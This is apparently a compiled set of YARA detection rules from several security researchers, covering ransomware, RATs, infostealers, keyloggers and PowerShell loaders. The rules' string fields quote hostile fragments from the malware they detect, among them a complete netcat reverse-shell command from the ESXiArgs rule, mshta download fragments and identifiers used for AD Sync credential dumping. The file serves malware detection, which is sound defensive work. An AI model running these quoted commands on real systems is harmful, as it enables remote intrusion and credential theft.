		description = "Detects the frequent usage of Wscript to get an hex encoded string from an array and interpret it. Used by e.g WSHRAT"
		author = "SECUINFRA Falcon Team"
		id = "dd55753e-4f7b-56be-a6d4-66f1d7dc8747"
		date = "2022-12-02"
		modified = "2022-02-13"
		reference = "https://github.com/SIFalcon/Detection"
		source_url = "https://github.com/SIFalcon/Detection/blob/2d7c66d7d16c7541bf2a9a83a7a6d334364a26fd/Yara/Obfuscation/javascript_obfuscation.yar#L2-L19"
		license_url = "N/A"
		logic_hash = "62bc3261b3c2e902a82423239a7ee0bcedfccbeeeda11833b935197144dc7c35"
		score = 75
		quality = 70
		tags = ""

	strings:
		$wscript = "= WScript["
		$hex_enc_str1 = "\\x63\\x72\\x65\\x61"
		$hex_enc_str2 = "\\x73\\x63\\x72\\x69"
		$hex_enc_str3 = "\\x71\\x75\\x69\\x74"
		$hex_enc_str4 = "\\x41\\x72\\x67\\x75"

	condition:
		#wscript> 30 and 2 of ( $hex_enc_str* )
}

rule SECUINFRA_RANSOM_Esxiargs_Ransomware_Python_Feb23
{
	meta:
		description = "Detects the ESXiArgs Ransomware encryption bash script"
		author = "SECUINFRA Falcon Team (@SI_FalconTeam)"
		id = "6e2d6695-b727-5b71-bfa0-e8290e057c36"
		date = "2023-02-07"
		modified = "2023-02-07"
		reference = "https://secuinfra.com/en/techtalk/hide-your-hypervisor-analysis-of-esxiargs-ransomware"
		source_url = "https://github.com/SIFalcon/Detection/blob/2d7c66d7d16c7541bf2a9a83a7a6d334364a26fd/Yara/Malware/RANSOM_ESXiArgs_Ransomware_Python_Feb23.yar#L1-L31"
		license_url = "N/A"
		logic_hash = "b821d1829ab4fb5eea896156a303198d6531d734196f0f947aef5d46754e6ccb"
		score = 75
		quality = 70
		tags = ""
		tlp = "CLEAR"

	strings:
		$python = "#!/bin/python"
		$desc = "This module starts debug tools"
		$command0 = "server_namespace"
		$command1 = "service_instance"
		$command2 = "local"
		$command3 = "operation_id"
		$command4 = "envelope"
		$cmd = "'mkfifo /tmp/tmpy_8th_nb; cat /tmp/tmpy_8th_nb | /bin/sh -i 2>&1 | nc %s %s > /tmp/tmpy_8th_nb' % (host, port)"
		$OpenSLPPort = "port = '427'"
		$listener = "HTTPServer(('127.0.0.1', 8008), PostServer).serve_forever()"

	condition:
		$python and $desc and 4 of ( $command* ) and $cmd and $OpenSLPPort and $listener
}

rule SECUINFRA_MALWARE_Plugx_USB_Delivery_Ini_Icon_Jun23
{
	meta:
		description = "Detects PlugX-style Malware delivery via removable Drives (USB) - Desktop.ini Icon File; could potentially yield FPs"
		author = "SECUINFRA Falcon Team (@SI_FalconTeam)"
		id = "faaa507f-8478-5412-be86-4cae7fe28d21"
		date = "2023-06-21"
		modified = "2023-06-21"
		reference = "https://unit42.paloaltonetworks.com/plugx-variants-in-usbs/"
		source_url = "https://github.com/SIFalcon/Detection/blob/2d7c66d7d16c7541bf2a9a83a7a6d334364a26fd/Yara/Malware/MALWARE_PlugX_USB_Delivery_Jun21.yar#L33-L49"
		license_url = "N/A"
		logic_hash = "1cf552c4627073d13832cf0ac602a610e0919af9e9a197aa07fef5d6a414644b"
		score = 75
		quality = 70
		tags = ""
		tlp = "CLEAR"

	strings:
		$s_shellclassinfo = "[.ShellClassInfo]" ascii
		$s_IconRes = "IconResource=C:\\Windows\\system32\\SHELL32.dll,7" ascii

	condition:
		all of ( $s_* )
}

rule SECUINFRA_SUS_Unsigned_APPX_MSIX_Manifest_Feb23
{
	meta:
		description = "Detects suspicious Microsoft Windows APPX/MSIX Installer Manifests"
		author = "SECUINFRA Falcon Team (@SI_FalconTeam)"
		id = "f24f7e03-3cc5-5214-b6d2-205b69898636"
		date = "2023-02-01"
		modified = "2023-02-07"
		reference = "https://twitter.com/SI_FalconTeam/status/1620500572481945600"
		source_url = "https://github.com/SIFalcon/Detection/blob/2d7c66d7d16c7541bf2a9a83a7a6d334364a26fd/Yara/Filetypes/SUS_Unsigned_APPX_MSIX_Manifest_Feb23.yar#L1-L25"
		license_url = "N/A"
		logic_hash = "4e3de25fdad9d76cefbb191424a739368b521c4f234656c397f4122debe749fa"
		score = 65
		quality = 70
		tags = ""
		tlp = "CLEAR"

	strings:
		$xlmns = "http://schemas.microsoft.com/appx/manifest/"
		$identity = "OID.2.25.311729368913984317654407730594956997722=1"
		$s_entrypoint = "EntryPoint=\"Windows.FullTrustApplication\""
		$s_capability = "runFullTrust"
		$s_peExt = ".exe"

	condition:
		uint32be( 0x0 ) == 0x3C3F786D and $xlmns and $identity and 2 of ( $s* )
}

rule RUSSIANPANDA_Darkgate_Autoit
{
	meta:
		description = "Detects DarkGate AutoIT script"
		author = "RussianPanda"
		id = "b30544b5-88c9-5a84-8582-f4f72b228f24"
		date = "2024-01-26"
		modified = "2024-01-26"
		reference = "https://yara.readthedocs.io/en/stable/writingrules.html?highlight=xor"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/1ce9c0dec191b43d51ceb34234a12e63970b252c/DarkGate/darkgate_autoit.yar#L1-L19"
		license_url = "N/A"
		hash = "e1803b01e3f187355dbeb87a0c91b76c"
		logic_hash = "dda6726d09035d6f61ca331d18ed37f032c6f6a5ab88e1754a21587f4c79ac87"
		score = 75
		quality = 85
		tags = ""

	strings:
		$h = "AU3!EA06"
		$s1 = "just_test.txt" xor(0x01-0xff)
		$s2 = "c:\\temp\\data.txt" xor(0x01-0xff)
		$s3 = "test.txt" xor(0x01-0xff)
		$s4 = "cc.txt" xor(0x01-0xff)
		$s5 = "c:\\temp\\data.txt" xor(0x01-0xff)
		$s6 = "uu.txt" xor(0x01-0xff)

	condition:
		3 of ( $s* ) and $h
}

rule RUSSIANPANDA_Sentinel_Stealer
{
	meta:
		description = "Detects Sentinel Stealer"
		author = "RussianPanda"
		id = "8a221d7b-8fa6-53cd-a3e8-63cc67285186"
		date = "2024-01-19"
		modified = "2024-01-19"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/1ce9c0dec191b43d51ceb34234a12e63970b252c/SentinelStealer/sentinel_stealer.yar#L1-L14"
		license_url = "N/A"
		hash = "3a540a8a81c5a5b452f154d7875423a3"
		logic_hash = "b9d72848842ea4d26544633bb83fccd17239b28493bde3f73341eb2004d8ee0c"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "Sentinel.SmallerEncryptedIcon" wide
		$s2 = "SentinelSteals" wide
		$s4 = "_CorExeMain"

	condition:
		all of them
}

rule RUSSIANPANDA_Fakebat_Powershell
{
	meta:
		description = "Detects FakeBat PowerShell scripts"
		author = "RussianPanda"
		id = "76149a6f-c370-5e48-82cc-c89b545c0aa8"
		date = "2023-12-01"
		modified = "2023-12-01"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/1ce9c0dec191b43d51ceb34234a12e63970b252c/FakeBat/fakebat_powershell.yar#L1-L13"
		license_url = "N/A"
		logic_hash = "df6b30d97ac6c9b248fed0d901e8a0a6ad1d855483a5006b008b839d9961092a"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "$LoadDomen/?status=start&av=" nocase
		$s2 = "$xxx.gpg" nocase

	condition:
		all of ( $s* )
}

rule RUSSIANPANDA_Win_Mal_Koistealer_PS
{
	meta:
		description = "Detects KoiStealer PowerShell script"
		author = "RussianPanda"
		id = "6dfdb39c-1b6a-5969-9c2d-e09869af6e0f"
		date = "2024-04-04"
		modified = "2024-04-04"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/1ce9c0dec191b43d51ceb34234a12e63970b252c/Koi/win_mal_KoiStealer_PS.yar#L1-L12"
		license_url = "N/A"
		hash = "4f55be0b55ec67dfda42b88e9c743a2a"
		logic_hash = "8a60a1d770eb4b5048762ddfd4657fdf7a430b09eb454ae5a5bb3103460907db"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "index.php?id=$guid&subid="
		$s2 = "$config"

	condition:
		all of ( $s* )
}

rule EMBEERESEARCH_Win_Orcus_Rat_Simple_Strings_Dec_2023
{
	meta:
		description = "Strings observed in Orcus RAT"
		author = "Matthew @ Embee_Research"
		id = "baef6b96-bf94-5363-9186-9761a8055afd"
		date = "2023-12-24"
		modified = "2023-12-24"
		reference = "https://github.com/embee-research/Yara-detection-rules/"
		source_url = "https://github.com/embee-research/Yara-detection-rules//blob/ac56d6f6fd2a30c8cb6e5c0455d6519210a8b0f4/Rules/win_orcus_rat_simple_strings_dec_2023.yar#L1-L26"
		license_url = "N/A"
		hash = "30a2a674d55d7898d304713dd2f69a043d875230ea7ebee22596ba4c640768db"
		logic_hash = "2e0a44ec2749e0fc646dfb003a2d32b3fecfa07ece72ca5a65116250d80496b8"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = "Orcus is a Remote Administration Tool for Windows. It allows the administrator to make changes to the system remotely." wide
		$s2 = "Orcus.Service" wide
		$s4 = "costura.orcus" wide
		$s5 = "Orcus.Commands"
		$s6 = "Orcus.Shared"
		$s7 = "Orcus.Utilities"
		$s8 = "Orcus.StaticCommands"
		$s9 = "Orcus.Plugins"

	condition:
		(5 of them )
}

rule EMBEERESEARCH_Win_Berbew_Strings_Dec_2023
{
	meta:
		description = "Strings observed in Berbew malware."
		author = "Matthew @ Embee_Research"
		id = "402711af-c543-5c95-ae9e-e663825b6653"
		date = "2023-12-24"
		modified = "2023-12-26"
		reference = "https://github.com/embee-research/Yara-detection-rules/"
		source_url = "https://github.com/embee-research/Yara-detection-rules//blob/ac56d6f6fd2a30c8cb6e5c0455d6519210a8b0f4/Rules/win_berbew_strings_dec_2023.yar#L1-L19"
		license_url = "N/A"
		hash = "24dc0af3c51118697df999d8bffcdfc9cbf0d07f2630473450dd826a1ae4b9ae"
		logic_hash = "a7f687e749ec69961777063d52678461a8e288c80037fac051d7b1a5b568d9e8"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = "This KEWL STUFF was coded by V. V. PUPKIN"
		$s2 = "REAL CASH, REAL BITCHEZ"
		$s3 = "Please, enter your Card Number"

	condition:
		all of them
}

rule SBOUSSEADEN_Webcreds_Regexp_B64
{
	meta:
		description = "No description has been set in the source file - SBousseaden"
		author = "SBousseaden"
		id = "85283a81-5bc3-5e3f-89f6-bcc1f40f3dc2"
		date = "2020-03-08"
		modified = "2020-12-28"
		reference = "https://github.com/orlyjamie/mimikittenz/blob/master/Invoke-mimikittenz.ps1"
		source_url = "https://github.com/sbousseaden/YaraHunts//blob/71b27a2a7c57c2aa1877a11d8933167794e2b4fb/hunt_capab_credentials_access.yara#L24-L43"
		license_url = "N/A"
		logic_hash = "432c812177a50c50d08feb88a1293ecb625b9b0aa6a839789da150255bc83228"
		score = 75
		quality = 75
		tags = ""

	strings:
		$p1 = "&password=" base64
		$p2 = "&login_password=" base64
		$p3 = "&pass=" base64
		$p4 = "&Passwd=" base64
		$p5 = "&PersistentCookie=" base64
		$p6 = "password%5D=" base64
		$u1 = "&username=" base64
		$u2 = "&email=" base64
		$u3 = "login=" base64
		$u4 = "login_email=" base64
		$u5 = "user%5Bemail%5D=" base64
		$reg = ".{1,"

	condition:
		3 of ( $p* ) and 3 of ( $u* ) and #reg > 3
}

rule SBOUSSEADEN_Adsync_Creddump_Wide
{
	meta:
		description = "AD Connect Sync Credential Extract"
		author = "SBousseaden"
		id = "ccbfa79a-924b-512a-a9e9-005567b4fe83"
		date = "2020-04-08"
		modified = "2020-12-28"
		reference = "https://blog.xpnsec.com/azuread-connect-for-redteam/"
		source_url = "https://github.com/sbousseaden/YaraHunts//blob/71b27a2a7c57c2aa1877a11d8933167794e2b4fb/hunt_capab_credentials_access.yara#L45-L67"
		license_url = "N/A"
		logic_hash = "e8b0ff1fa9117a98799239d37c5a0ae8be25c2c2519c4fc2a1d7f085a9ebe2e1"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = "private_configuration_xml" wide xor
		$s2 = "LoadKeySet" xor
		$s3 = "encrypted_configuration" wide xor
		$s4 = "GetActiveCredentialKey" xor
		$s5 = "DecryptBase64ToString" xor
		$s6 = "KeyManager" xor
		$s7 = "(LocalDB)\\.\\ADSync" wide xor
		$s8 = "mms_management_agent" wide xor
		$s9 = "keyset_id" wide xor
		$s10 = "xp_cmdshell" xor
		$s11 = "System.Data.SqlClient"
		$s12 = "Password" wide xor
		$fp1 = "mmsutils\\mmsutils.pdb"

	condition:
		5 of them and not $fp1
}

rule SBOUSSEADEN_Adsync_Creddump_Xor
{
	meta:
		description = "Azure AdSync Service Account Password Dumping"
		author = "SBousseaden"
		id = "e0d951ec-ec39-5f37-b5a8-ddd0b1dc588d"
		date = "2020-03-08"
		modified = "2020-12-28"
		reference = "https://blog.xpnsec.com/azuread-connect-for-redteam/"
		source_url = "https://github.com/sbousseaden/YaraHunts//blob/71b27a2a7c57c2aa1877a11d8933167794e2b4fb/hunt_capab_credentials_access.yara#L69-L89"
		license_url = "N/A"
		logic_hash = "831ed0410000ad9dfa7be2ab1f64a4130810465cf699bb3e45c93075db6fdb74"
		score = 75
		quality = 75
		tags = ""

	strings:
		$a1 = "private_configuration_xml" xor
		$a2 = "LoadKeySet" xor
		$a3 = "encrypted_configuration" xor
		$a4 = "GetActiveCredentialKey" xor
		$a5 = "DecryptBase64ToString" xor
		$a6 = "Cryptography.KeyManager" xor
		$b1 = "mms_management_agent" xor
		$b2 = "Microsoft Azure AD Sync\\Bin\\mcrypt.dl" xor
		$b3 = "xp_cmdshell" xor
		$b4 = "Password" xor
		$b5 = "forest-login-user" xor
		$b6 = "forest-login-domain" xor

	condition:
		4 of ( $a* ) or 4 of ( $b* )
}

rule SBOUSSEADEN_Adsync_Creddump_V64
{
	meta:
		description = "Azure AdSync Service Account Password Dumping"
		author = "SBousseaden"
		id = "9f536ff2-95b6-5f93-8c6f-e3738d6404c7"
		date = "2020-03-08"
		modified = "2020-12-28"
		reference = "https://blog.xpnsec.com/azuread-connect-for-redteam/"
		source_url = "https://github.com/sbousseaden/YaraHunts//blob/71b27a2a7c57c2aa1877a11d8933167794e2b4fb/hunt_capab_credentials_access.yara#L91-L111"
		license_url = "N/A"
		logic_hash = "e2465fec6dd9384d5d7f31f1c0e7661f4fbd5e3f87a14abfcb9b0412985cb1d6"
		score = 75
		quality = 75
		tags = ""

	strings:
		$a1 = "private_configuration_xml" base64
		$a2 = "LoadKeySet" base64
		$a3 = "encrypted_configuration" base64
		$a4 = "GetActiveCredentialKey" base64
		$a5 = "DecryptBase64ToString" base64
		$a6 = "Cryptography.KeyManager" base64
		$b1 = "mms_management_agent" base64
		$b2 = "Microsoft Azure AD Sync\\Bin\\mcrypt.dl" base64
		$b3 = "xp_cmdshell" base64
		$b4 = "Password" base64
		$b5 = "forest-login-user" base64
		$b6 = "forest-login-domain" base64

	condition:
		4 of ( $a* ) or 4 of ( $b* )
}

rule SBOUSSEADEN_Adsync_Creddump_Xwide
{
	meta:
		description = "Azure AdSync Service Account Password Dumping"
		author = "SBousseaden"
		id = "a8c3e60a-99b8-50c8-992c-fbe18499a615"
		date = "2020-03-08"
		modified = "2020-12-28"
		reference = "https://blog.xpnsec.com/azuread-connect-for-redteam/"
		source_url = "https://github.com/sbousseaden/YaraHunts//blob/71b27a2a7c57c2aa1877a11d8933167794e2b4fb/hunt_capab_credentials_access.yara#L112-L132"
		license_url = "N/A"
		logic_hash = "9015005494cb3cc52645a9c82f6179992942243a816b05273bc26f58ac70a2e0"
		score = 75
		quality = 75
		tags = ""

	strings:
		$a1 = "private_configuration_xml" wide xor
		$a2 = "LoadKeySet" wide xor
		$a3 = "encrypted_configuration" wide xor
		$a4 = "GetActiveCredentialKey" wide xor
		$a5 = "DecryptBase64ToString" wide xor
		$a6 = "Cryptography.KeyManager" wide xor
		$b1 = "mms_management_agent" wide xor
		$b2 = "Microsoft Azure AD Sync\\Bin\\mcrypt.dl" wide xor
		$b3 = "xp_cmdshell" wide xor
		$b4 = "Password" wide xor
		$b5 = "forest-login-user" wide xor
		$b6 = "forest-login-domain" wide xor

	condition:
		4 of ( $a* ) or 4 of ( $b* )
}

rule ELCEEF_HTML_Windows_Search_Abuse
{
	meta:
		description = "Detects HTML files abusing Windows system functionalities to redirect and download malicious payloads"
		author = "marcin@ulikowski.pl"
		id = "537cb46e-4cfc-517c-8d6d-0019f2c3e5ef"
		date = "2024-06-15"
		modified = "2024-06-16"
		reference = "https://github.com/elceef/yara-rulz"
		source_url = "https://github.com/elceef/yara-rulz/blob/05834717d1464d5efce8ad9d688ff7b53886a0bb/rules/HTML_Windows_Search.yara#L1-L22"
		license_url = "https://github.com/elceef/yara-rulz/blob/05834717d1464d5efce8ad9d688ff7b53886a0bb/LICENSE"
		logic_hash = "6a0d490cf08ab0aad3c535645abe9ebc26d12768cf2a2e932cdb7ec93cf3e2bd"
		score = 75
		quality = 73
		tags = ""
		hash1 = "d136dcfc355885c502ff2c3be229791538541b748b6c07df3ced95f9a7eb2f30"

	strings:
		$location1 = "location.href" wide ascii
		$location2 = "location.replace(" wide ascii
		$location3 = "location.assign(" wide ascii
		$metarefresh = "<meta http-equiv=\"refresh\"" nocase wide ascii
		$search1 = "\"search-ms:query=" wide ascii
		$search2 = "\"search:query=" wide ascii
		$search3 = "URL=search:query=" wide ascii
		$crumb1 = "&crumb=location:" wide ascii
		$crumb2 = "&amp;crumb=location:" wide ascii

	condition:
		( any of ( $location* ) or $metarefresh ) and any of ( $search* ) and any of ( $crumb* )
}

rule ELCEEF_Base64_SVG_Javascript
{
	meta:
		description = "Detects base64 encoded SVG objects containing Javascript"
		author = "marcin@ulikowski.pl"
		id = "99275772-1f4f-5616-9a9c-f76b613fe143"
		date = "2022-10-25"
		modified = "2022-12-12"
		reference = "https://github.com/elceef/yara-rulz"
		source_url = "https://github.com/elceef/yara-rulz/blob/05834717d1464d5efce8ad9d688ff7b53886a0bb/rules/Base64_SVG_Javascript.yara#L1-L16"
		license_url = "https://github.com/elceef/yara-rulz/blob/05834717d1464d5efce8ad9d688ff7b53886a0bb/LICENSE"
		logic_hash = "e4cb08ccc75dc00b518c4ee1495409ae6bb99e7d493be55312b8d39aa9099cfc"
		score = 75
		quality = 75
		tags = ""
		hash1 = "fe394a59e961c3fbcc326e7d0ee5909596de55249e669bc4da0aed172c11fda8"
		hash2 = "f0c94f2705b1aea17f4a6c6d71c6ed725fe71bf66b03b0117060010859ca8a19"

	strings:
		$svg = "\"data:image/svg+xml;base64" wide ascii
		$js = "<script type=\"text/javascript\">" base64

	condition:
		all of them
}

rule CRAIU_Susp_Ios_Shutdown
{
	meta:
		description = "Detect shutdown.log files from sysdiags with suspicious entries"
		author = "Costin G. Raiu, Art of Noh, craiu@noh.ro"
		id = "08aa1fb9-7af0-515a-91a8-09ed35e48155"
		date = "2023-12-28"
		modified = "2024-03-05"
		reference = "https://securelist.com/shutdown-log-lightweight-ios-malware-detection-method/111734/"
		source_url = "https://github.com/craiu/yararules/blob/23cf0ca22021fa3684e180a18416b9ae1b695243/files/susp_ios_shutdown.yara#L2-L25"
		license_url = "https://github.com/craiu/yararules/blob/23cf0ca22021fa3684e180a18416b9ae1b695243/LICENSE"
		logic_hash = "936101f2dddb73f6dda41be47d775199c458aa4fecdcf348ed479da620343ea1"
		score = 65
		quality = 85
		tags = ""
		version = "1.0"
		tlp = "TLP:CLEAR"

	strings:
		$a1 = "these clients are still here:"
		$b1 = "/private/var/db/"
		$b2 = "/private/var/tmp/"
		$c1 = "After "

	condition:
		($c1 at 0 ) and $a1 and ( any of ( $b* ) )
}

rule DITEKSHEN_MALWARE_Win_Qulab
{
	meta:
		description = "Qulab information stealer payload or artifacts"
		author = "ditekSHen"
		id = "6ae24c67-5700-5330-a3bd-d542162faebb"
		date = "2024-11-01"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L959-L983"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "659d828cbef38c6362b612be9bdc05ae820f49c23684e77af6462ea677133284"
		score = 75
		quality = 75
		tags = ""
		clamav_sig = "MALWARE.Win.Trojan.QulabZ-Stealer"

	strings:
		$x1 = "QULAB CLIPPER + STEALER" ascii wide
		$x2 = "MASAD CLIPPER + STEALER" ascii wide
		$x3 = "http://teleg.run/Qulab" ascii wide
		$x4 = "http://teleg.run/jew_seller" ascii wide
		$x5 = "BUY CLIPPER + STEALER" ascii wide
		$s1 = "\\Screen.jpg" ascii wide
		$s2 = "attrib +s +h \"" ascii wide
		$s3 = "\\x86_microsoft-windows-" ascii wide
		$s4 = "\\amd64_microsoft-windows-" ascii wide
		$s5 = "Desktop TXT File" ascii wide
		$s6 = "\\AutoFills.txt" ascii wide
		$s7 = "\\CreditCards.txt" ascii wide
		$s8 = "a -y -mx9 -ssw" ascii wide
		$s9 = "\\Passwords.txt" ascii wide
		$s10 = "\\Information.txt" ascii wide
		$s11 = "\\getMe" ascii wide

	condition:
		9 of them or ( ( 1 of ( $x* ) and 4 of ( $s* ) ) or 1 of ( $x* ) )
}

rule DITEKSHEN_MALWARE_Java_Pyrogenic
{
	meta:
		description = "Pyrogenic/Qealler infostealer payload"
		author = "ditekSHen"
		id = "2b9268f0-2f73-51ad-ab72-9289e42e5bb1"
		date = "2024-11-01"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L1434-L1446"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "bb8cb939f06a376f72dcbbb1f04ec34526f72c3bcc3b146b905a8466826d2c24"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = "bbb6fec5ebef0d93" ascii wide
		$s2 = "2a898bc98aaf6c96f2054bb1eadc9848eb77633039e9e9ffd833184ce553fe9b" ascii wide
		$s3 = "addShutdownHook" ascii wide
		$s4 = "obfuscated/META-INF/QeallerV" ascii wide
		$s5 = "globalIpAddress" ascii wide

	condition:
		all of them
}

rule DITEKSHEN_MALWARE_Win_Quilclipper
{
	meta:
		description = "Detects QuilClipper variants mostly in memory or extracted AutoIt script"
		author = "ditekSHen"
		id = "bd23ec5a-f21a-5133-a77a-de2615933b82"
		date = "2024-11-01"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L4076-L4094"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "dcac93806a438b188ae70a679301cb6630b9eb6849bf8fbbb1cea5fed5e7cf75"
		score = 75
		quality = 75
		tags = ""

	strings:
		$cnc1 = "QUILCLIPPER by" ascii
		$cnc2 = "/ UserName:" ascii
		$cnc3 = "/ System:" ascii
		$s1 = "DLLCALL ( \"kernel32.dll\" , \"handle\" , \"CreateMutexW\" , \"struct*\"" ascii
		$s2 = "SHELLEXECUTE ( @SCRIPTFULLPATH , \"\" , \"\" , FUNC_" ascii
		$s3 = "CASE BITROTATE" ascii
		$s4 = "CASE BITXOR" ascii
		$s5 = "CLIP( FUNC_" ascii
		$s6 = "CLIPPUT (" ascii
		$s7 = "FUNC _CLIPPUTFILE(" ascii
		$s8 = "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Schedule" ascii

	condition:
		all of ( $cnc* ) or all of ( $s* )
}

rule DITEKSHEN_MALWARE_Win_PWSH_Poshkeylogger
{
	meta:
		description = "Detects PowerShell PoshKeylogger"
		author = "ditekSHen"
		id = "a816d716-caeb-5f08-9043-29db531f9e7c"
		date = "2024-11-01"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L4612-L4627"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "20bde87ded7e3b68bc554c4b9a6c2ef08514f0d47b6b144763927bede81ea540"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = "::GetKeyboardState" ascii
		$s2 = "GetAsyncKeyState(" ascii
		$s3 = "::MapVirtualKey(" ascii
		$s4 = "::GetAsyncKeyState" ascii
		$s5 = "Start-Sleep" ascii
		$s6 = "send-mailmessage" ascii
		$s7 = "[System.IO.File]::AppendAllText($" ascii
		$s8 = "new-object Management.Automation.PSCredential $" ascii

	condition:
		6 of them
}

rule DITEKSHEN_MALWARE_Win_PWSH_Poshwifistealer
{
	meta:
		description = "Detects PowerShell PoshWiFiStealer"
		author = "ditekSHen"
		id = "69ac123d-b746-57f1-a488-547f9a9cdd86"
		date = "2024-11-01"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L4754-L4765"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "769349360b5d22226a5339a9e8471d06731dc522475c9385c1c145a0488e0ad1"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = "netsh wlan export profile" ascii
		$s2 = "Send-MailMessage" ascii
		$u1 = "https://github.com/axel05869/Wifi-Grab" ascii
		$u2 = "/exploitechx/wifi-password-extractor" ascii

	condition:
		all of ( $s* ) or all of ( $u* )
}

rule DITEKSHEN_MALWARE_Win_Pwshloader_Runpe01
{
	meta:
		description = "Detects PowerShell PE loader / executer. Observed Gorgon TTPs"
		author = "ditekSHen"
		id = "fd44f48c-7a24-512b-8375-c9f978a8b5bd"
		date = "2024-11-01"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L4907-L4920"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "7dd377f6a1cc48ef8ab9d53989755fb967c89d3798b721781bc09043ba3d86f4"
		score = 75
		quality = 75
		tags = ""

	strings:
		$rp1 = "GetType('RunPe.RunPe'" ascii
		$rp2 = "GetType(\"RunPe.RunPe\"" ascii
		$rm1 = "GetMethod('Run'" ascii
		$rm2 = "GetMethod(\"Run\"" ascii
		$s1 = ".Invoke(" ascii
		$s2 = "[Reflection.Assembly]::Load(" ascii

	condition:
		all of ( $s* ) and 1 of ( $rp* ) and 1 of ( $rm* )
}

rule DITEKSHEN_MALWARE_Win_Pwshloader_Runpe02
{
	meta:
		description = "Detects PowerShell PE loader / executer. Observed Gorgon TTPs"
		author = "ditekSHen"
		id = "08261054-bebc-58fe-949a-27f6e817003a"
		date = "2024-11-01"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L4922-L4934"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "d7677689938d3e3eb6b59b99b7e347c60214f6edf8e5f83bf85da5a5f1ad33bb"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = "'.Replace('" ascii nocase
		$s2 = "'aspnet_compiler.exe'" ascii
		$s3 = "[Byte[]]$" ascii
		$pe1 = "(77,90," ascii
		$pe2 = "='4D5A" ascii

	condition:
		all of ( $s* ) and ( #pe1 > 1 or #pe2 > 1 ) and #s1 > 4
}

rule DITEKSHEN_MALWARE_Win_VBS_Dlagent01
{
	meta:
		description = "Detects VBS MSHTA downloader"
		author = "ditekSHen"
		id = "447ea323-ecab-5f6b-b13e-0690254c754e"
		date = "2024-11-01"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L5384-L5395"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "0e47839a55773764aca0aebcf1078c06c729b86d1e2f18d7d64e3bb11e87f3eb"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = "llehS.tpircsW" ascii
		$s2 = ".Run" ascii
		$s3 = "mshta http" ascii nocase
		$s4 = "StrReverse" ascii

	condition:
		all of them
}

rule DITEKSHEN_MALWARE_Win_PWSH_Poshcookiestealer
{
	meta:
		description = "Detects PowerShell PoshCookieStealer"
		author = "ditekSHen"
		id = "7326a056-288b-534b-811d-172bd6936d7b"
		date = "2024-11-01"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L9066-L9080"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "234958098d09732675dd539e8d25c6754ba50bf92b3a19e7fef8c68d70503ec4"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = "\\User Data\\default\\Network\\Cookies" ascii nocase
		$s2 = "Send-ToEmail" ascii
		$s3 = "[Security.Cryptography.ProtectedData]::Unprotect($" ascii
		$s4 = "$($env:LOCALAPPDATA)\\" ascii
